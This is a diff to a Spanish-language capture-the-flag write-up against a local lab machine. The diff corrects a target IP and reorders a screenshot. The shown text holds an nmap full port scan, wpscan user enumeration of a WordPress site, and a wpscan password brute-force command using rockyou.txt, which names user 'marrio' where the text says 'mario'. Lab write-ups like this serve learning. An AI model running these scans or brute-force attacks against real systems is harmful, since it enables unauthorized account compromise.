@@ -27,7 +27,7 @@ para comprobar conectividad con la maquina victima, realizado el
 ping pasamos a realizar el escaneo con nmap.
 
 ```bash
-sudo nmap -sS -sV -Pn -T4 -p- --open -oA trust 172.18.0.2
+sudo nmap -sS -sV -Pn -T4 -p- --open -oA trust 172.17.0.2
 ```
 ![nmap](1.png)
 
@@ -80,12 +80,13 @@ luego lo exportamos y podemos hacerlo persistente.
 
 Hecho esto procedemos a realizar el escaneo con wpscan
 
-![wpscan](6.png)
-
 ```bash
 echo 'export WPSCAN_API_TOKEN'
 wpscan --url http://172.17.0.2/wordpress/ --enumerate u                  
 ```
+
+![wpscan](6.png)
+
 
 Con el escaneo encontramos un usuario:
 
@@ -93,6 +94,7 @@ Con el escaneo encontramos un usuario:
 
 ahora realizamos un ataque de fuerza bruta con wpscan al usuario 
 mario:
+
 ```bash
 wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames marrio
 ```
